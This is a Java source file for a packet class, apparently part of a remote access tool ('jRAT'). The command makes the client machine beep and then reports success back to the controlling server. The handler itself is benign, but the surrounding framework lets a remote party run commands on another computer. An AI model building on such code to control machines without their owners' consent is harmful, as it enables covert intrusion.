package net.jrat.core.packet.server;

import java.awt.Toolkit;

import net.jrat.core.Client;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C1PacketMessage;

public class S5PacketBeep implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	@Override
	public void execute(Object object) throws Exception
	{
		Toolkit.getDefaultToolkit().beep();
		Client.instance.outputStream.writeObject(new C1PacketMessage("successfully played beep!"));
	}
}